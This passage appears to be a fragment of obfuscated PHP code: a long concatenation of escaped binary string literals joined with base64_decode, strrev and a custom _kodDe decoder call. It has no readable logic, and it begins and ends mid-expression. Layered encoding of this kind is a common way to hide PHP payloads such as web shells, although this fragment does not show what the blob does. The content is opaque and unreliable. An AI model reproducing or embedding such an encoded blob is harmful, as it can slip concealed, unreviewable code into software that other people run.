2\241\140\311\44\0\353\361\26\244\200"."\75\124\167\300\333\352\133\306\242\255\76\157\207\47\30\151\161\267\264\163\234\56\167\47\211\104\22\160\27\143\272\354\370\21\300\315\203\154\57\24\311\303\175\35\355\314\210\155\343\21\241\42\165\204\323"."\11\130\171\124\102\233\244\271\160\67\211\132\102\104\333\230\236\243\324\312\304\255\64\145\20\151\205\314\120\45\117\344\342\162\374\123\41\271\203\222\225\215\60\126\20\35\143\101\324\14\32\7\362\25\371".base64_decode('vkSYb1ENIhCnWU3ohvp9AHfCYoRREAfzhqeBEXCjbSugBDQiEToXTSDmu2l1EnzLGPGDvbUbbg==')."\x38\x23\xbd\x1\x7f\x57\x1b\xc9\x30\x32\xa0\xd2\xa\xf8\x48\xf7\x97\x53\x49\x84\xec\x3b\x2d\xce\x92\x80\x18\xa1\x70\x89\x90\x76\xfa\xa0\x4e\xbb\x72\x2\xff\x9c\x80\x7f\x80\xe4\x45\x3e\xae\x66\x68\xaf\x47\x21\x63\x66\x8c".strrev('Hô°'."\0".'ÄjÇ)B+·±‡Eªè³Ne(É“AÖ;`¿kX1çE=uE¯±ÏUL¡lÀ%nƒ')."\x87\x58\xfa\x10\xdd\x87\xe0\xc4\x80\x37\x48\xb9\x80\xa1\xe\xe7\x34\xda\x5d\x2e\xe7\x2c\x42\xc5\x2a\x58\x7f\xc8\xe7\x5d\x2b\xc3\x23\xb3\xca\xfb\x1c\xb3\x9c\xfd\x20\x50\x51\xb9\x8\x47\x49\x2c\xec\xb4\x45\xa7\x93\xfc\x39".base64_decode('g+WGIki52VRRH3aFXeVN9X1ux7jiGK9yzHf0zwo7K2YRQP/qGrluDUQAiE3T+sFPQ7hpRthxwg==').base64_decode('SasW9YX7Z9bPmhp2TguP9FdWNNHvxHIG2GPFxlhV47PKQZWAaMJQMoglCgg0YVzLcujqOWsoHA==')."\214\241\232\344\71\372\34\341\131\375\115\102\76\1\124\370\55\40\272\0\376\74\300\360\334\216\25\260\145\54\53\234\367\204\76\162\231\30\347\256\160\136\104\225\30\341\3\132\62\303\246\20\130\320\331"."\xde\xd6\x2e\xf2\xae\x9e\x81\x7f\xd7\xd0\x81\x4c\xaa\x74\x59\x86\x7\x54\x6\xa1\xce\x5c\x46\x1b\xa6\x7b\xf7\x8c\x3a\x4c\x2\xba\x45\xe9\x3b\xaa\x5a\x23\x2a\x25\xf\x0\xb7\xc5\x1\x71\xd0\x7d\x16\x48\x12\x62\x29\x24\xa4"."\221\57\360\275\216\212\4\177\322\212\154\4\212\135\43\54\26\127\63\144\234\366\45\330\146\114\311\252\101\241\205\221\110\310\335\334\341\215\120\16\103\70\61\215\43\256\330\314\116\273\100\323\70\107\145"."\233\106\56\16\107\304\316\313\52\124\52\200\333\112\266\322\273\312\303\341\134\237\32\357\357\3\4\251\70\22\375\253\153\327\124\120\111\326\25\6\377\321\10\346\103\344\313\131\76\16\46\220\231\142\26"."\x5b\x38\x8b\xe\x8e\x22\x8c\x93\xc1\x2a\xb0\x5d\xbf\x6e\xb0\xf5\x12\xc2\xb9\xf4\x69\xe9\x96\x92\x62\x68\x30\x2d\x4\x21\x94\x6b\xd0\x35\x97\x6c\x8e\xf1\x40\x74\x70\x66\x2\x57\x59\xe1\x58\xd\x71\xba\x2e\x76\x66\xc4\xe".base64_decode('AIQTHQCThSj+t6GMstsMIOgWvtj4PA4yGO5lDh8RxFlAoyKjAqalRaGmnjNiKsOxCQuWYoC1hw==')."\x4b\x68\x50\x96\x12\xce\xfd\x40\xcd\x65\x78\x0\x20\xc3\xb5\x51\x6\x52\x9b\xc\x8f\x5f\x64\x2e\x79\xca\x7c\x1f\x2f\x33\x39\x52\x26\xe2\xa5\xcc\x4b\x27\x41\x9f\x47\xd6\x4c\xf\x12\x73\x65\x5a\x55\x6b\x0\x6e\x86\x53\xca"."\x98\x8c\xab\xdd\xa1\xe6\xd5\x94\x4c\x2b\x2d\xd3\xb6\xc8\xb4\xe2\x32\xda\x2e\x78\x48\x25\x7a\x0\x59\x90\x4a\xa0\x20\x98\xe3\x3\x32\x1c\x5\x38\xa4\xb4\x14\x18\xa4\xad\x67\x32\xb1\xcc\xe5\x65\x39\x69\xe8\xb9\x6c\x37\xfd"."\x92\x10\xc3\x95\x21\x0\x5e\x53\x6\x8\xe8\xba\x25\xd3\xfd\xb\xb\x74\x32\x6\x2\xab\xc3\x43\x4b\xf9\x38\xf3\xda\xb3\xd5\x8f\x34\x81\x48\x4\x5\x75\xc0\x50\x98\xde\xaa\xe4\xc5\x71\x2d\x39\xc6\x19\x3b\x3d\xf0\x53\x4b".base64_decode('fqbGpZ3CfUTh0QzvRF6JkJIMCp8HW3f6bQwOqLGxGN+IeISdjT3GxhnRWimCKT3OjBqm7LsvJQ==')."\132\116\53\204\104\154\4\65\51\341\362\126\371\263\174\121\200\163\75\10\266\215\302\154\246\40\77\147\36\71\262\210\51\146\214\212\33\43\364\156\100\245\60\241\332\264\321\266\162\141\224\117\72\332\62"."\x9\x16\x20\xb\x6c\x15\x8e\x80\x83\xf\xa3\x10\x25\x3f\x9a\x1e\xc1\xdd\x19\x49\x33\xe1\x9f\xf5\x6f\x1\x9f\x81\xdd\xdd\xad\x65\xc6\xb4\x8c\xb8\xbd\xe6\x50\xce\xce\xf8\xc0\x43\x12\xe6\x31\xdc\xc7\x93\x85\x31\xdb\xe0\xdb"."\x77\x99\x6c\xeb\x65\xb0\xb5\x1b\x12\x18\x1a\xdf\x86\x82\xda\xc3\xac\x42\xdd\x49\x49\x5\x35\xa7\x93\xcc\x61\x8f\xf2\x39\xd7\x3\x76\x32\x11\x5a\x1b\x42\xac\x84\x36\x7\x14\x83\xf7\x32\x9d\x47\x90\x78\x59\xab\x4c\x88\xc2"."\xa3\x2\x5a\x42\xc9\x73\x4e\x6e\xcb\x23\x50\xbf\x69\x8d\xb1\x93\x8\x21\x68\x2f\x14\x47\x3d\x93\x45\xda\xd9\x6\xad\x54\x54\x9c\x76\x9a\xd9\x1\x7a\xb3\x54\x18\xb5\x34\xa4\x97\x8c\xa2\x85\x5b\x2\x4b\x36\x3d\xa5\xa2\x12"."\x78\xa4\xe0\x24\x0\x44\x85\x91\x8a\xd8\xe\xd\x70\x35\xdc\x8c\xbd\x1\xd9\x23\x5\x46\xc0\x70\xc2\x49\xd2\x6\x99\x97\xb8\xc0\xf0\xc5\x7\x32\x4c\x1c\x16\x90\xb2\x85\x7c\xce\xc6\x8f\x4b\xad\x69\x85\x1c\xb9\x0\x5a\x10"."\xe5\x1f\xb5\xb1\x9b\xa2\x15\x88\xc8\x1d\x44\x5c\xac\x2a\x68\x99\x5\x76\xf\x51\xc5\x70\x1a\xa0\x34\xfe\x11\xce\xb2\x89\x4c\x90\x63\x80\xfe\x42\xc\x73\xcc\xb4\xd4\x74\x87\x4e\x45\x4d\x48\xbb\xde\xb8\x66\x41\x8\xe4\x44"."\x3a\x3d\x13\xe2\x88\x2\x1b\x66\x30\xa1\x40\xd4\x1c\x67\x51\xff\xa5\xb4\x21\x92\x4b\x9e\x61\xc3\x2c\xc5\x7c\x9d\x95\x88\x5f\x3a\xf9\xda\x20\xae\x2c\xe2\xdd\xb\x44\xe3\x2d\x87\x77\x39\x38\x24\xdc\x5f\xa6\xd9\xe5\xe\x2"."\72\115\113\317\362\24\41\212\223\205\44\136\250\200\305\72\37\325\20\160\357\70\132\277\171\27\42\134\222\27\11\250\230\60\235\51\200\341\24\331\210\333\60\350\0\343\346\301\3\22\0\24\101\160\252".base64_decode('BekBXSluigv35vm9JC4KftiJFxenEo/76emVGC5GFTfrpQtCV8WsKCFWGh1s0/ltU2F80ix4ng==')."\211\231\104\310\244\331\132\221\154\112\117\365\113\301\230\314\325\132\100\103\174\261\343\267\171\205\222\250\235\161\374\220\270\124\64\3\370\200\226\216\103\336\66\240\145\124\223\255\52\206\131\212\107\374\220".strrev('üÁˆmƒæÊ€;%¶XˆÉhs,#¾pL€5Ä'."\0".'ÖÀlÎLÑ“şHVìW7Œ¥}(ˆBíJ“bH')."\xc3\x2d\x6a\x35\xf4\xb4\xcf\xf\xe6\x57\x69\xa2\x2b\xc4\x53\xe9\xd1\xc\x62\x6a\xa3\x6c\xa7\x24\x66\x2\x44\x2\x57\x90\xc9\xca\xa4\xc9\xac\x28\xbe\xdc\xbc\x71\x29\xfe\xfd\xe5\x1d\xef\x7f\xf3\xef\xb3\x36\xdf\x8d\x63\x75"._kodDe('L3nTC4qRkGZuULKTnelixKEq6Q5+5qs+zqZJN8e6vTC30cbgsI22bgv96D7kHtIgbt1n+qGOBW4=')."\xc4\x93\x57\xff\xf1\xea\x19\xf7\x7f\xf1\xec\xa6\xb4\xf1\xd5\x34\xef\x59\x2b\x4f\x5e\xf9\xfc\x95\xd\x77\x2d\xda\xef\xae\xfb\xf7\x7b\x4e\x72\x1f\xfa\x9f\x57\xff\x7a\xde\xc4\x5a\xe7\xdd\x77\x2e\x3e\x71\xa4\x6b\xd7\x47\xfe"."\x7e\xd9\x9a\x67\xfe\xbc\x73\xfb\xdc\x3b\x1f\xd\xfe\x63\xea\x5e\x27\xed\xfc\xf6\x89\xa6\xd1\x9d\x9b\xf7\xff\x6e\xd3\xc9\x1f\x7c\xf2\xb7\xb3\xf\xe9\x74\x5d\x3a\xbe\x72\x6e\xce\x79\x54\xbd\xa7\xa5\xeb\xa0\xf3\xa6\xfd\xec"."\x2f\x67\x9f\xd1\x79\xc8\x96\xb7\x57\x79\x5e\x9f\xb8\xfa\xb4\xc3\xae\xe\x6f\xbd\x60\xdd\x5e\x1b\xe6\xc5\x4f\xd9\xfd\x8d\xb6\x87\xfe\xb1\x76\xe1\x1b\x9f\x5f\x36\x30\xe0\xba\x6b\xdb\x4f\xbe\xfb\xf9\x45\x97\x64\x9b\x3d\x8b"."\xdb\xce\xbd\xaa\x75\xea\x81\xa1\xda\x4f\x16\x5d\x7d\x6c\x73\x6b\xe0\xe3\xb7\xba\x37\xde\x73\x45\xb8\xe7\xda\x39\x1f\xf\xa6\x66\xef\x5f\xb6\xfe\xac\x33\xeb\xcf\x5c\x38\xe5\xe8\xd6\xd\x7b\x34\x9f\x77\xd7\x3\x6f\xef\xbc"."\152\345\202\55\316\115\313\336\170\356\341\252\303\132\217\376\347\37\376\42\55\252\235\155\245\216\275\166\117\347\201\147\314\173\345\127\236\300\336\257\166\336\277\351\245\167\217\233\375\365\356\237\135\367\322".strrev('ÿ£áúøÎ÷Ëé¥¼nš+)³ğºc–äÿ®e×µ†òü_Ô«›û\'ÑØû{ïûéŞë¿íjğ§Û')."\xb5\x6b\x53\xb9\x75\xce\x5\xe7\xcf\xaa\x7a\x76\xdb\xfd\xf1\xfa\xc6\xab\x2f\xbd\xf4\xf0\xd7\xe5\xed\x53\xc2\xd1\x55\x2f\x7c\xbe\xe8\xfe\x6f\xbb\x2e\x9b\xfb\xf5\xee\x55\x69\x87\x76\x57\xfd\xde\xf\x6e\x7e\xfd\xc3\x54\xcf"."\xab\x83\x2b\xee\x5a\xd5\x77\xa8\x77\xe6\x63\x1b\xcf\xed\xd8\xbc\xe1\x9d\x43\xd6\xee\xf1\xc8\x29\x67\xce\xe9\xbc\x73\xc3\xb6\xb\xce\x1c\x9e\xf3\xc2\x94\x13\x67\x5c\xfa\xec\x91\x8f\xdd\xb0\x49\xdd\xfe\xe9\x35\xd7\x2b\xa7"."\x2e\xfe\xf7\x93\xfb\x5c\x68\x7c\xf5\xe0\xa6\xa3\xd4\x5f\xdc\x74\x4e\xc7\xc6\x17\x2e\x7c\x3b\xb1\xef\x7e\x1f\xbc\x7e\xfe\x5\x8e\xc3\xb3\xbe\x53\x8f\x79\x7c\x97\xa7\x36\xfe\x7d\xf4\x82\xa9\x27\x9d\xbd\x36\xbb\xeb\xac\x6b"."\317\235\377\227\15\315\307\355\170\72\74\370\120\313\117\217\373\346\374\133\336\351\376\151\337\113\315\33\173\66\164\206\235\127\237\277\361\255\246\364\202\377\353\174\365\374\306\317\35\343\53\312\103\35\33"."\236\71\345\363\317\132\366\176\46\273\145\323\157\37\176\300\233\127\376\171\346\173\7\231\247\33\257\154\331\326\171\333\202\123\367\236\167\127\323\176\25\371\5\346\213\123\53\253\167\231\267\361\240\143\245"."\43\257\375\46\367\263\346\233\106\177\172\314\354\375\376\171\325\45\236\113\217\333\153\273\262\105\272\371\221\343\32\247\74\262\357\276\147\257\334\272\345\260\43\127\37\74\272\45\261\145\350\341\353\17\335"."\253\372\370\3\206\57\375\143\373\341\145\371\267\177\165\110\323\63\107\71\326\154\352\73\164\351\326\327\217\175\377\17\37\374\364\224\213\337\332\262\331\171\307\145\17\77\175\344\222\370\175\367\314\275\355".base64_decode('tvteX3f6un9MO+2EI6/Z9fFjI4/+33nX3R075ox3V48aj068Mv3cqQ/uduUNH82s6uwvrx64cg==')."\xaf\xdf\xdc\xee\x8b\xdf\xff\x7b\xd7\x1\x87\xaf\x28\xdf\x92\x7e\xf5\x98\x86\xdb\xd6\xb8\x6b\x7f\xab\x1d\xa4\x1c\x16\x1c\x5c\xfd\x48\xe3\xe8\x2f\xbd\xa7\xde\xf9\xe6\xa2\x37\xf6\xca\x3a\xe5\x7d\xf7\x9c\xfb\x8a\x39\x63\xef"."\xf8\x69\x9b\xd5\xf3\x67\xaa\xe6\x37\x1f\x6f\xff\xd9\x43\x77\x6f\x38\xf0\xb4\xe5\xd7\xff\xe6\x8e\xcf\x8c\x9f\x3f\xf4\xe6\x2d\x9d\x37\xd7\x9d\x7a\x71\xc5\xc2\x1b\xf\xc9\xfd\x29\x78\x6c\xeb\xd7\xbf\x3c\xe2\xe0\xd\xb7\xbf"."\x76\xfc\xc1\x5b\x9a\x2e\xd9\x3b\xf8\xfe\x81\x1b\xaf\x9\xba\xe7\xce\x7c\x68\xe8\x84\x3b\xd3\x2b\xb6\x78\x6f\xd9\x75\xff\xdb\x7b\x3e\xb8\x77\xf0\x7d\x25\x77\xdb\xfa\x39\x3b\xa6\x4a\x47\xbf\x7d\xcc\xde\x53\x17\x5c\xfd\xd6"."\145\237\74\164\106\363\203\313\273\157\277\366\117\27\255\152\273\163\271\343\331\351\373\55\76\144\237\320\221\133\27\224\337\265\362\320\107\257\333\315\63\355\331\356\243\72\153\277\360\235\272\313\173\117\236".base64_decode('/usdC05cUjF0YvWsLZn27j/cM1g/9Hj9HTtrbut/UOquWH/dYXX3PjKvcdF7X5/0z0U33/PqZQ==')."\xbf\x1b\xbc\xf1\x11\x75\xe4\x98\xbe\xc1\x5b\x5f\x38\x4a\x3e\xf4\xaa\x53\x4f\xbb\xe3\xf6\x9b\xd2\xbf\x9b\x93\x8a\x76\x7c\x70\xfb\xd2\xf2\x63\xee\xf\x2f\x59\x7c\xc2\x6d\x7f\x6a\x5e\xb9\xdf\x3f\xd6\x2d\xdd\xb1\xef\xab\xeb".base64_decode('q49+cv7tN+x+sHf47kXb0o9eeGTmkR1ffOW9f6Cj65pLvevVXZT71q9zLF69flfvtOCmC/95iA==')."\xeb\xaa\x43\x7f\xfe\xf8\x59\x7b\xae\x4d\xbc\xfd\xb3\xf\x4e\x9f\xf7\x79\xae\x79\xfd\xcd\xa9\xe5\x2b\x2e\x5e\x79\xe7\x73\xeb\xee\x8c\x1c\x13\xdd\xd4\x75\xfe\x49\xaf\x37\x37\xdd\xf2\xab\x7b\x12\x2f\x9d\xbd\xe2\xd1\xc7\xaa"."\117\135\131\373\257\350\131\237\377\133\156\65\277\74\66\170\110\363\104\372\345\157\76\334\364\365\147\57\235\365\355\343\353\56\373\363\231\257\215\276\127\165\300\155\165\257\274\174\367\11\367\33\123\173\37".strrev('µü`{/«7Èú7ÏçkÄ6=Ùæ}®ËÓ\'›ëLGæú®÷)Ñ{‹m÷†œç£üî}©ï¸?o')."\x77\x3f\x53\xbf\x3d\x78\xd5\xa1\x7b\xef\x36\xba\xe0\xd4\x87\x37\xfd\x7d\xa8\xee\x98\xcd\xad\x7\xd5\xdd\xb6\x6e\xc7\x99\xfb\xbf\x5a\xff\xee\x41\xcb\x36\x5e\x77\xf7\x65\xef\x3f\xec\xbe\xea\x80\x37\xd7\x3f\xff\xd1\x4f\x96"."\376\362\303\253\226\234\162\353\275\353\306\166\134\66\321\65\322\276\307\340\255\15\17\334\235\274\342\201\341\350\71\333\117\75\375\224\335\173\6\177\162\300\335\117\135\163\376\354\265\373\14\36\121\65\315"."\365\351\322\267\315\314\247\362\313\347\36\264\142\337\266\173\277\172\360\360\335\227\130\13\256\176\144\352\301\251\364\326\127\334\137\235\62\366\351\21\37\375\143\254\155\356\47\367\67\17\347\324\17\266\77"."\xd5\xd9\x9e\xfb\xfa\xcb\xba\xc8\xa3\x7b\x3d\xa5\x95\x3f\x63\xe6\xee\x19\xaa\xb4\xf6\xdf\x78\xdf\x93\x7\xbe\x38\xff\xe3\x47\xa6\x1a\x6f\x3f\x76\xeb\x6f\x57\xee\xfc\x78\x47\xaf\xeb\xbb\xf1\xcf\xde\x7f\x72\xdb\xe5\x97\x4f"."\174\363\257\257\136\274\261\367\243\376\315\137\277\277\363\261\246\77\67\115\234\364\361\53\21\147\344\301\7\167\176\353\372\365\366\223\315\343\77\61\233\276\274\375\210\324\316\75\356\171\334\374\360\304\327"."\36\132\165\250\163\360\370\224\113\72\264\274\354\35\345\251\267\225\277\376\352\255\335\277\332\322\170\354\341\353\176\73\53\232\162\376\345\314\343\216\154\312\316\75\357\267\145\155\207\115\271\343\272\226\262"."\163\274\273\356\37\130\173\261\373\363\304\33\313\222\167\337\36\170\352\327\267\216\134\276\135\132\163\230\371\326\123\73\267\214\277\175\357\214\327\227\337\377\160\145\344\233\375\135\241\137\127\135\262\256\142"."\237\43\156\77\250\327\370\113\163\346\211\253\246\235\177\324\214\163\116\170\161\277\325\256\125\355\153\106\366\67\167\146\277\175\375\302\273\333\206\356\135\372\342\24\317\365\27\273\266\36\167\363\115\67\177"."\xf8\xc1\x9c\x6f\x3e\x3b\x4b\xdb\xb8\xd1\xf9\xe1\xe1\xf\x6c\x1a\xdc\xf4\x7f\xce\xeb\x63\xff\x5a\xfb\xd3\xb5\x4b\x2e\x5d\xde\xf5\xe5\x2b\x33\x9c\xdb\xee\xde\x63\xc6\xfb\xfb\x3c\x7b\xd1\x7e\x65\x7\x2f\x4d\xa5\x4f\x79\xec".base64_decode('tGvLp3Ytu/TVAxa+Uzt9ymlH/+EWn3bV9FeatwaWzkts3xY9Y9uLc6/61XMnbf1m+hVr731s3w==')."\233\276\234\343\314\317\176\174\215\161\371\374\103\377\360\314\13\217\335\370\301\325\261\47\16\354\313\334\61\177\365\354\362\247\276\133\362\216\164\326\263\313\273\236\336\317\273\151\312\253\207\237\170\126\343".strrev('ô»Ÿ_¯Éó¾oõùpşÍÕû]Îo_Ò~¼¯{Îôß7«àî;àóx}ßKöƒúùé.«õç{¿').strrev('~+9Ç³ØŞ½*Óóöš®İÏşş:/™ëêö>tïŸø^$ç×Åv>Fó¼×ıcõşebÿs¬çÄ')."\177\347\75\17\4\256\237\73\343\236\52\343\305\171\337\275\125\321\223\373\333\241\47\335\121\276\347\272\333\166\306\317\234\262\356\330\337\174\171\326\346\137\356\372\213\173\116\175\347\375\13\364\255\113\356"."\273\371\364\363\345\127\207\46\342\15\316\47\117\262\116\75\277\151\355\156\207\365\45\336\331\343\262\53\273\17\112\105\122\107\214\175\172\203\361\331\353\227\17\357\272\361\247\107\176\375\161\355\266\213\226"."\367\374\253\176\377\212\51\203\57\216\137\371\370\226\350\312\67\373\337\236\137\33\275\344\216\117\56\272\355\167\173\176\123\276\113\375\360\376\133\173\203\325\13\37\376\374\257\237\337\160\376\25\207\236\172"."\341\317\175\37\155\256\273\262\256\365\210\375\57\326\366\161\155\52\73\351\344\3\122\357\277\71\127\136\233\273\346\223\305\173\136\342\165\276\363\255\374\227\107\147\136\72\226\173\343\223\35\317\76\364\267"."\xe7\xd6\x7f\x14\x5e\x78\xf8\xec\x63\xcf\x6d\xda\x6d\xcf\x2b\x5f\xfb\xf3\xa3\x87\xfd\xf1\xb8\x4b\x2f\x72\x6e\x3c\x63\xe1\xd6\xa7\x9b\x17\x3c\x5d\x75\xfc\xea\xc7\x6b\xe4\xdc\xf2\x17\xfe\xbc\xdf\x9c\x97\xe7\x7e\x56\xef\x7f"."\377\257\107\107\67\356\363\371\21\147\257\73\364\171\351\76\353\344\153\275\107\145\66\334\25\355\377\307\177\256\333\364\257\173\116\370\342\336\13\357\164\336\274\360\127\127\266\30\23\17\316\176\360\326\57"."\xbd\x1b\xee\x5d\xfc\xc4\xef\x7e\xf7\xe2\x23\xb7\xd7\x5e\xff\x93\xbb\x9f\xd7\xce\x5d\xf3\xe2\x25\x17\xdf\x34\xef\xa7\x23\x8b\x1f\x6f\xd0\x5f\xdd\xf8\xdb\x5d\x97\xed\xf8\xe3\x33\x47\xe6\x3f\x7f\xff\x99\x13\xc7\x72\x1f\x3c"."\77\255\375\216\175\127\366\70\356\70\266\345\330\266\171\27\71\336\232\275\377\261\276\103\357\231\37\134\263\361\312\301\251\355\57\76\330\163\360\27\73\217\274\341\243\205\326\101\137\371\17\176\340\47\351"."\345\317\177\164\246\362\356\27\107\376\342\265\303\157\374\105\342\167\335\7\347\76\275\140\150\321\56\227\233\17\374\173\331\123\117\176\372\346\61\55\367\116\357\375\325\346\247\2\207\127\337\133\326\160\215"."\174\310\266\7\237\372\315\115\3\177\177\331\267\311\263\165\332\314\61\337\151\373\107\257\154\177\150\342\363\57\326\136\33\351\337\371\371\247\67\272\176\76\366\337\347\137\332\361\335\127\317\174\365\304\345"."\341\223\166\376\347\355\203\276\333\371\371\127\327\356\360\377\376\354\241\265\67\316\174\326\371\335\147\235\73\277\170\346\162\147\344\241\373\166\376\347\221\117\43\337\175\270\163\375\171\316\337\377\367\325\27"."\217\274\374\333\57\376\161\371\247\203\273\237\265\377\157\156\370\370\221\265\43\157\44\147\257\70\357\371\47\344\151\27\74\175\316\253\163\337\330\313\177\147\333\313\177\130\375\326\7\137\234\376\306\271\117"."\247\136\274\171\305\346\347\137\173\103\373\340\303\273\277\70\250\376\227\257\257\374\171\326\232\370\342\215\157\367\156\177\341\200\324\201\216\157\342\133\357\73\356\343\47\334\355\127\275\360\244\225\277\46\156"."\x7e\xd5\x3c\x7c\x67\xe8\x96\x9b\xfe\xf1\xdf\xa9\xcb\xe\xd8\x79\xe0\x5d\x7\x2c\xf\xde\xf0\xe4\x97\xc1\x93\x9e\x5a\xff\x51\xcf\xd2\x89\xff\x3b\xfe\x3c\x33\xf7\xc2\xec\xa3\x1f\x8c\xbc\x70\x65\x70\xe2\x90\xc3\x5e\x59\x1c"."\x70\x9f\x90\xaa\x89\xce\x3d\xf9\xba\xc3\x9a\xe\x9c\x3a\xed\xf3\x2b\x92\x7a\xb0\xd7\xd8\xed\xb5\x8d\xd\x4b\x16\x6d\xba\xfd\x8f\xcb\x2e\x71\x6c\x78\xed\xa5\x53\x2f\x96\x5e\xba\xeb\x95\xfb\x76\xfb\x6e\xf7\xf1\xeb\x67\x1e"."\xbd\xe4\x8\xaa\x35\x5c\x53\x3b\x87\x88\x86\x35\xf3\x71\x80\x88\x88\x75\xd5\x24\xae\xe7\xd4\x44\x3a\x3a\x88\x23\xf1\x81\x64\x26\x1b\x23\x87\xfd\x75\x24\xc3\x3c\x82\x59\x43\x0\x35\x35\x44\xbe\x9c\x37\x8f\x40\xe2\x89\xd1"."\xe1\xdc\x20\x39\xdd\x23\x7a\x4\xf3\xe6\x13\xe5\x86\x79\x75\xe4\x3a\x26\x15\x8b\xa6\x7\x86\x89\x0\x5b\x4d\xeb\x33\x9b\x1c\x2b\x68\xe9\xf1\x3c\x13\xe2\xeb\xaa\xc8\x27\x72\x43\x63\x5a\x82\x29\x65\xe6\x94\xec\x8\x95\xdd"."\153\50\46\376\235\73\173\66\335\255\14\215\45\23\244\75\263\151\351\265\363\353\350\206\41\31\217\15\222\343\74\335\114\32\51\225\334\11\315\233\103\160\323\343\331\261\344\40\271\147\231\117\77\220\327"."\162\112\234\336\43\316\256\242\235\123\65\217\6\110\107\317\233\115\152\26\33\32\117\16\246\310\227\346\120\321\174\366\134\122\317\164\76\221\122\143\104\67\165\66\311\74\247\226\216\322\34\362\201\1\315"."\112\45\342\244\224\331\363\346\222\326\222\337\304\100\132\215\346\111\3\346\317\43\245\344\364\101\65\77\112\72\155\164\60\75\142\304\310\56\157\376\374\132\212\142\50\231\374\0\35\107\222\61\251\147\124"."\305\40\132\110\343\11\45\237\312\121\105\155\153\74\251\123\374\332\232\71\64\100\152\131\135\115\52\24\7\333\227\174\206\334\353\15\146\125\43\61\116\250\51\65\62\250\253\243\104\127\151\130\111\15\306".strrev('T‡Nªs¥aˆş	GV”ZKW˜‘‘g#aù2³´#¨>7dÅÉ@kÒqò\'K›.‡MR$²')."\x37\x9f\x4d\xe\x2b\xe3\xa4\x11\x83\x99\xbc\xa1\xd\x13\x14\x5d\xb1\xd2\xc9\x2c\x21\x9a\xea\x3a\xd2\x18\x55\xb3\x46\xb2\x6\xc1\xaf\x9b\x3b\x87\xee\x94\xf3\x43\x99\x71\xd2\xc4\xba\xf9\x73\x29\x45\x10\x3a\x51\xc6\x86\x86".strrev('ë~KR9Ñç"‘`éU5 ì‰ÒYãÃ*U´5=£+JŸOt˜‚PçØt:Qùã')."\50\315\104\365\230\72\234\265\350\104\247\124\1\366\350\43\111\172\51\233\33\321\6\207\11\211\214\303\53\336\364\20\45\55\322\20\123\211\345\214\121\322\101\325\264\41\312\350\270\231\34\43\43\121\75".base64_decode('l5BrMpZPq+P0kDyqDsZjpCHzZ5Pazae48+aT4R4dGBpTBsk4DqXjyrhJSA9UbnjAIofURn4slQ==')."\x56\xc8\xa6\x9e\xd2\xaf\x99\xca\xa9\x71\x3d\x46\x87\xd2\x1c\xc9\xa7\xc9\x88\x44\x53\x89\xb1\x58\x9c\x34\x73\x79\x9a\xec\x9c\x9b\x95\xd8\x10\x3d\x5d\x5\xbb\x6d\x2b\x67\x16\x20\x50\x25\xef\x98\xa8\x19\x38\xa4\xaa\x54\x5".base64_decode('jirZ8ctPM4f0UWk635vDQw3hkhRGgyJuLGMJySBmS4VKafAIgcfoOXXQApOWXhtjLQ0nrKHT3g==')."\x20\x4a\x16\x4\x23\x1e\xb5\xa5\x33\x28\x3d\x78\x28\x4c\x49\x14\xc2\xa3\xa8\xeb\x9c\xb4\x7\xa2\x42\x4f\x2a\xf1\xb4\x96\x71\x5a\x8a\x39\xe4\x14\xc1\xe\x31\x55\xcb\x80\xc2\x52\x29\xa7\xdd\x34\x84\x57\x8e\xdf\xbb\xa5\xc7"."\314\341\124\121\62\357\51\374\211\110\121\353\304\336\43\124\47\261\373\47\162\213\102\43\374\74\215\252\40\341\237\125\62\65\6\251\220\220\32\126\120\42\32\151\62\371\75\0\377\204\11\207\11\23\142"."\237\51\23\5\151\117\263\140\345\222\215\223\61\253\147\211\236\40\121\221\41\35\342\202\35\102\165\70\112\215\115\121\313\141\143\171\133\312\141\220\324\36\233\156\70\213\273\17\17\262\330\101\266\257\243"."\36\347\331\222\126\161\67\221\117\363\357\222\123\175\16\20\351\306\116\332\66\212\262\117\12\162\376\207\354\107\144\11\177\120\226\320\35\231\144\267\150\360\171\370\140\212\104\146\250\331\224\22\143\225\312"."\x8e\x49\x9\x5\xa0\xc7\xeb\xa5\x4\x98\x3d\x12\x55\xbe\x95\x2c\x9d\x86\xc5\xea\x88\x17\x74\x5\xd\xb0\xcd\xc6\xc2\x26\xd8\x12\x41\x4f\xe6\x98\xd\x0\xbb\x61\x10\xf\x23\xd1\x3d\x25\xef\x4c\x1c\x65\x37\x18\x41\x50\x12"."\273\137\65\324\270\106\65\277\324\64\302\244\332\226\350\206\202\251\234\305\122\140\215\266\335\216\54\154\312\16\144\241\121\230\265\240\211\30\246\104\204\17\222\60\327\347\25\241\251\302\253\26\72\117\235"."\x36\x82\x86\x68\x42\xe\x49\x35\xc\xdd\x58\x0\xb9\x53\x3\x87\x12\xe6\x9d\x81\xe1\x40\x2e\x3\x53\x9\xfd\xbb\x84\xfc\x4e\x8e\x3a\x32\x8b\x2e\x70\xf8\xb7\xd3\xde\x70\x50\x61\x7\xeb\xb\xd0\x3e\xc0\x98\xe3\x26\x32\x80"."\43\124\74\225\214\203\140\200\22\340\335\10\263\243\136\375\236\254\226\330\364\54\140\376\31\246\75\143\246\24\172\165\143\202\25\101\313\250\154\0\162\46\127\24\124\22\104\251\336\227\51\204\340\70\324".strrev('8Ã§Tq"<,7TJ‘ĞTèaW=Ah*¬Ù*‘ª›·H–¾ƒ»6ÚÔ²Z©$u)ºRÄ‹8')."\x8d\x2f\xc0\x17\x3a\x6a\xbd\x50\x2f\x70\x57\xa8\x7\xce\xef\xfb\x60\x8c\xeb\x83\xc3\x53\x73\xf1\x2e\xd0\x34\x47\x74\x83\x7c\x9\x1a\x6a\x41\xd5\xbe\xa0\xc4\x79\x5e\x4b\xbb\x3b\xc0\xd4\xf7\x66\x3b\xab\x9c\xd5\x1c\x17\x7c".base64_decode('MAK1GBuoEUkw5A6UMNrDxnxk/IgBH8nQ7u+VWvwdPZ1dQWylhuFdfiEdKWnZkkUwKdbb3eFu8Q==')."\112\276\256\220\237\152\137\62\45\124\302\360\355\53\102\26\232\316\60\43\75\222\37\107\104\335\140\261\104\126\22\41\372\76\171\146\270\54\134\31\56\17\127\254\162\206\315\176\302\346\127\11\313\235\46".base64_decode('jg6JdHtI6+pZKG4S4uoMBpcQLXR/wN3SQWsEqIcE/S0+HNix4fatD5y749Jbtp15Diho+yWnbA==')."\377\315\75\133\357\73\347\335\123\67\157\273\345\354\35\17\235\273\175\303\255\333\317\76\231\64\343\335\133\357\335\272\371\367\73\66\134\267\355\226\213\266\377\372\376\35\227\234